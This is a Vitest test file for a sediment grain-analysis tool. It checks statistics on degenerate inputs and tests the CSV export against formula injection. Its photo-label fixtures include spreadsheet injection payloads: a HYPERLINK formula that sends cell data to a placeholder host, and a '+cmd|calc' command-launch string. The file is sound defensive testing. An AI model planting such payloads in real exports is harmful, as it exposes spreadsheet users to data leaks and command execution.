// Audit: degenerate-input behaviour and CSV formula injection, exercised on the real modules.
import { it, expect } from 'vitest';
import { writeFileSync } from 'node:fs';
import { computeSedimentStats } from '../../src/modules/sedimentStats';
import { exportPooledGrainsCsv } from '../../src/modules/siteAnalysis';
import type { GrainMorphometrics } from '../../src/types/index';
import { squareGrainSession } from '../../tests/helpers/squareSession';

const g = (id: number, b: number, extra: Partial<GrainMorphometrics> = {}): GrainMorphometrics => ({
  id, areaPx: Math.PI * b * b / 4, centroidX: 50, centroidY: 50, aAxisPx: b * 1.5, bAxisPx: b, dEqPx: b,
  orientationRad: 0, touchesBorder: false, bbox: [0, 0, 1, 1], ...extra,
} as GrainMorphometrics);
const log: Record<string, unknown> = {};

it('degenerate stats', () => {
  const r0 = computeSedimentStats([]);
  const r1 = computeSedimentStats([g(1, 10, { bAxisMm: 5, dEqMm: 5 })]);
  const rBorder = computeSedimentStats([g(1, 10, { touchesBorder: true }), g(2, 12, { touchesBorder: true })]);
  const rMixed = computeSedimentStats([g(1, 10, { bAxisMm: 5, dEqMm: 5 }), g(2, 40)]);
  const rNaN = computeSedimentStats([g(1, 10, { areaPx: Number.NaN }), g(2, 20)]);
  log.empty = { unit: r0.unit, D50: r0.areaWeightedB.D50, fw: r0.folkWard };
  log.single = { D16: r1.areaWeightedB.D16, D50: r1.areaWeightedB.D50, D84: r1.areaWeightedB.D84, fw: r1.folkWard };
  log.allBorder = { included: rBorder.includedGrains, D50: rBorder.areaWeightedB.D50 };
  log.mixed = { unit: rMixed.unit, D50: rMixed.areaWeightedB.D50, note: 'calibrated grain silently reported in px' };
  log.nanArea = { included: rNaN.includedGrains, D50: rNaN.areaWeightedB.D50 };
  expect(Number.isNaN(r0.areaWeightedB.D50)).toBe(true);
});

it('csv formula injection via photo label', async () => {
  // Real sessions (the export reads hulls, outlines and calibration from them).
  const session = () => squareGrainSession([20, 24, 28]);
  try {
    const blob = exportPooledGrainsCsv([
      { photoId: 'p1', label: '=HYPERLINK("http://example.invalid/?"&A1,"open").jpg', included: true, session: session() },
      { photoId: 'p2', label: '+cmd|calc.jpg', included: true, session: session() },
      { photoId: 'p3', label: '=1+2.jpg', included: true, session: session() },
      { photoId: 'p4', label: '@SUM(1).jpg', included: true, session: session() },
    ]);
    const lines = (await blob.text()).split('\n').filter((l) => l !== '' && !l.startsWith('#'));
    // photo_id / photo label cells of the first data row of each photo: guarded with a leading '.
    log.csvLabelCells = [...new Set(lines.slice(1).map((l) => l.split(',').slice(0, 2).join(',')))];
    expect(lines.slice(1).every((l) => !/^[=+\-@]/.test(l))).toBe(true);
  } catch (e) {
    log.csvError = String(e);
    throw e;
  }
  writeFileSync('validation/oracle/edge_cases.json', JSON.stringify(log, null, 2));
});
